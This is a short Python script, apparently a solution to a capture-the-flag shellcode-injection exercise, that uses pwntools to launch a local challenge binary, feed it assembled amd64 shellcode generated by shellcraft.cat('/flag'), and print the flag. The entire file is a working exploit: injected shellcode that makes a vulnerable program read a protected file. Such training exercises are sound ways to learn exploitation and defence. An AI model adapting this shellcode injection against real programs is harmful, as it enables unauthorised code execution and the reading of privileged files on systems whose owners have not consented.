from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/shellcode-injection-level1.0"
p = process(challenge_path)

assembly = shellcraft.cat("/flag")	#直接读取flag
assemed=asm(assembly)
p.sendafter("Read a length of 0x1000 from the input.\n\n",assemed)
result=p.recvall()
print(result)

# python3 /home/hacker/si1.0.py